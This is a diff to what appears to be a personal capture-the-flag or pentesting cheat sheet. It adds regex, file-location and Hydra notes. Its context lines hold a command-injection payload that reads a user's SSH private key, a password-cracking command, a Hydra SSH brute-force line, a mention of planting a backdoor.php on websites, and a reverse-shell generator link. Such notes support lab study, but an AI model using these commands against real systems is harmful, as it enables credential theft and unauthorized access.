@@ -6,6 +6,11 @@ Check hacktricks on any subject. It'll probably have something useful.
 
 Always try default credentials.
 
+# Regular Expression
+
+https://regex101.com/
+
+Try to match expressions: think of it as really complicated grep.
 # Reconnaissance
 https://tio.run/#
 
@@ -29,7 +34,9 @@ We want to find the text 'looking for this', in a certain directory. This is use
 ```find / -name *flag* 2>/dev/null```
 Looks for everything with flag in the filename. The last part is nessesary, otherwise the command will spam you with unsuccessful searches
 
+# Locate File Location
 
+``` locate file.ext ```
 # Command Injection
 ```;cat /home/<user>/.ssh/id_rsa```
 
@@ -100,7 +107,11 @@ To crack a SSH key
 ```john -w=/usr/share/wordlists/rockyou.txt id.rsa.john```
 
 # Hydra
-```hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V -t 64```
+```hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V -t 64 -f```
+
+General Help on Hydra
+https://www.quora.com/Does-Hydra-stop-when-a-password-is-found
+
 
 # Abusing Certain Services Angle
 
@@ -173,4 +184,3 @@ Put the below into a file named backdoor.php, and put it in one of the websites,
 https://pentestbook.six2dez.com/enumeration/ports
 
 https://www.revshells.com/
-
